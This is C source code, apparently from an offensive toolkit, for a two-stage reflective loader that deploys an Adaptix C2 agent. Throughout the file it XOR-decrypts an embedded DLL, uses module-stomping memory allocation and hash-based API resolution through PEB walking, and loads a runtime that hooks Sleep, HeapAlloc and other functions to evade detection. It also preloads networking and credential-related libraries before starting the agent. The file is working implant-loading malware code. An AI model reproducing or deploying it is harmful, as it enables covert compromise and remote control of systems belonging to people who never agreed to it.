/*
 * ab-kit loader — two-stage PIC reflective loader for Adaptix C2.
 *
 * Stage 1 (this file, PIC):
 *   Decrypts the embedded DLL, allocates memory, bootstraps the PICO
 *   runtime, loads the DLL, and calls DllMain.
 *
 * Stage 2 (pico.c, PICO):
 *   Lives for the agent's lifetime. Hooks Sleep, HeapAlloc, ExitThread,
 *   etc. to add tradecraft at runtime.
 */
#include <windows.h>
#include "loader.h"
#include "memory.h"
#include "tcg.h"

#ifndef INITIAL_CHECKIN_DELAY_SECONDS
#define INITIAL_CHECKIN_DELAY_SECONDS 0
#endif

#if INITIAL_CHECKIN_DELAY_SECONDS < 0 || INITIAL_CHECKIN_DELAY_SECONDS > 86400
#error INITIAL_CHECKIN_DELAY_SECONDS must be between 0 and 86400
#endif

BOOL  stomp_alloc_pico(DWORD pico_code_sz, DWORD pico_data_sz,
                       MEMORY_LAYOUT * layout);
PVOID stomp_alloc_dll(SIZE_T requested_size, MEMORY_LAYOUT * layout);

typedef BOOL (WINAPI * FN_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
BOOL stomp_protect_chunked(FN_VirtualProtect vp, LPVOID base, SIZE_T size, DWORD prot);

DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);
#if INITIAL_CHECKIN_DELAY_SECONDS > 0
DECLSPEC_IMPORT VOID   WINAPI KERNEL32$Sleep(DWORD);
#endif

/* embedded resources — populated by Crystal Palace at link time */
char _PICO_ [0] __attribute__((section("pico")));
char _MASK_ [0] __attribute__((section("mask")));
char _DLL_  [0] __attribute__((section("dll")));

/* PICO export tags — Crystal Palace replaces with ror13 hashes */
int __tag_setup_hooks();
int __tag_setup_memory();
int __tag_patch_dispatch();

typedef void (* SETUP_HOOKS)(IMPORTFUNCS * funcs);
typedef void (* SETUP_MEMORY)(MEMORY_LAYOUT * layout);
typedef void (* PATCH_DISPATCH)(MEMORY_LAYOUT * layout);

/* DFR resolver — walks PEB export tables by ROR13 hash */
FARPROC resolve(DWORD mod_hash, DWORD func_hash)
{
    return findFunctionByHash(findModuleByHash(mod_hash), func_hash);
}

/* map PE section characteristics to memory protection */
static DWORD section_protect(DWORD ch)
{
    BOOL r = ch & IMAGE_SCN_MEM_READ;
    BOOL w = ch & IMAGE_SCN_MEM_WRITE;
    BOOL x = ch & IMAGE_SCN_MEM_EXECUTE;

    if (x && w && r) return PAGE_EXECUTE_READWRITE;
    if (x && r)      return PAGE_EXECUTE_READ;
    if (x && w)      return PAGE_EXECUTE_WRITECOPY;
    if (x)           return PAGE_EXECUTE;
    if (r && w)      return PAGE_READWRITE;
    if (w)           return PAGE_WRITECOPY;
    if (r)           return PAGE_READONLY;

    return PAGE_NOACCESS;
}

/* set per-section permissions and record them in the memory layout */
static void fix_permissions(DLLDATA * dll, char * dst, DLL_MEMORY * dll_mem)
{
    DWORD count = dll->NtHeaders->FileHeader.NumberOfSections;
    IMAGE_SECTION_HEADER * sec = (IMAGE_SECTION_HEADER *)
        PTR_OFFSET(dll->OptionalHeader, dll->NtHeaders->FileHeader.SizeOfOptionalHeader);

    for (int i = 0; i < (int) count; i++) {
        DWORD prot = section_protect(sec->Characteristics);
        DWORD sz   = sec->Misc.VirtualSize > sec->SizeOfRawData
                   ? sec->Misc.VirtualSize : sec->SizeOfRawData;

        stomp_protect_chunked(KERNEL32$VirtualProtect,
            dst + sec->VirtualAddress, sz, prot);

        if (i < MAX_SECTIONS) {
            dll_mem->Sections[i].BaseAddress     = dst + sec->VirtualAddress;
            dll_mem->Sections[i].Size            = sz;
            dll_mem->Sections[i].CurrentProtect  = prot;
            dll_mem->Sections[i].PreviousProtect = prot;
        }

        sec++;
    }

    dll_mem->Count = count < MAX_SECTIONS ? count : MAX_SECTIONS;
}

void go()
{
    IMPORTFUNCS   funcs;
    MEMORY_LAYOUT memory = { 0 };

    /* Optional build-time delay before the agent is decrypted or initialized. */
#if INITIAL_CHECKIN_DELAY_SECONDS > 0
    KERNEL32$Sleep((DWORD) INITIAL_CHECKIN_DELAY_SECONDS * 1000UL);
#endif

    /* --- extract embedded resources --- */

    char *     pico_src     = GETRESOURCE(_PICO_);
    DWORD      pico_code_sz = (DWORD) PicoCodeSize(pico_src);
    DWORD      pico_data_sz = (DWORD) PicoDataSize(pico_src);
    RESOURCE * masked_dll   = (RESOURCE *) GETRESOURCE(_DLL_);
    RESOURCE * mask_key     = (RESOURCE *) GETRESOURCE(_MASK_);

    /* --- decrypt DLL into staging buffer --- */

    char * dll_src = KERNEL32$VirtualAlloc(
        NULL, masked_dll->len,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (dll_src == NULL)
        return;

    for (int i = 0; i < masked_dll->len; i++)
        dll_src[i] = masked_dll->value[i] ^ mask_key->value[i % mask_key->len];

    /* --- parse PE and allocate destination --- */

    DLLDATA dll_data;
    ParseDLL(dll_src, &dll_data);

    if (!stomp_alloc_pico(pico_code_sz, pico_data_sz, &memory))
        return;

    char * dll_dst = (char *) stomp_alloc_dll(SizeOfDLL(&dll_data), &memory);
    if (dll_dst == NULL) {
        dll_dst = KERNEL32$VirtualAlloc(
            NULL, SizeOfDLL(&dll_data),
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        memory.DllAllocMethod = ALLOC_VIRTUALALLOC;
        memory.SacModule      = NULL;
    }
    if (dll_dst == NULL)
        return;

    /* --- allocate and load PICO runtime --- */

    char * pico_code = (char *) memory.Pico.Code;
    char * pico_data = (char *) memory.Pico.Data;
    if (pico_code == NULL || pico_data == NULL || memory.Pico.Module == NULL)
        return;

    funcs.LoadLibraryA   = LoadLibraryA;
    funcs.GetProcAddress = GetProcAddress;

    funcs.LoadLibraryA("winhttp.dll");
    funcs.LoadLibraryA("netapi32.dll");
    funcs.LoadLibraryA("samlib.dll");
    funcs.LoadLibraryA("wtsapi32.dll");
    funcs.LoadLibraryA("secur32.dll");
    funcs.LoadLibraryA("iphlpapi.dll");
    funcs.LoadLibraryA("dnsapi.dll");
    funcs.LoadLibraryA("wbemprox.dll");

    PicoLoad(&funcs, pico_src, pico_code, pico_data);

    stomp_protect_chunked(KERNEL32$VirtualProtect,
        pico_code, pico_code_sz, PAGE_EXECUTE_READ);

    /* --- setup_hooks: PICO overrides GetProcAddress for IAT hooking --- */

    ((SETUP_HOOKS) PicoGetExport(pico_src, pico_code, __tag_setup_hooks())) (&funcs);

    /* --- load DLL: sections, relocations, imports, permissions --- */

    LoadDLL(&dll_data, dll_src, dll_dst);
    ProcessImports(&funcs, &dll_data, dll_dst);

    memory.Pico.Code     = pico_code;
    memory.Pico.Data     = pico_data;
    memory.Pico.CodeSize = pico_code_sz;
    memory.Pico.DataSize = pico_data_sz;
    memory.Dll.BaseAddress = dll_dst;
    memory.Dll.Size        = SizeOfDLL(&dll_data);

    fix_permissions(&dll_data, dll_dst, &memory.Dll);

    /* --- setup_memory: tell PICO about all tracked regions --- */

    ((SETUP_MEMORY) PicoGetExport(pico_src, pico_code, __tag_setup_memory())) (&memory);

    /* --- start Adaptix agent --- */

    DLLMAIN_FUNC entry = EntryPoint(&dll_data, dll_dst);
    KERNEL32$VirtualFree(dll_src, 0, MEM_RELEASE);

    entry((HINSTANCE) dll_dst, DLL_PROCESS_ATTACH, NULL);

    /* --- patch_dispatch: fix PEB-walked function pointers in agent dispatch tables --- */

    ((PATCH_DISPATCH) PicoGetExport(pico_src, pico_code, __tag_patch_dispatch())) (&memory);
}
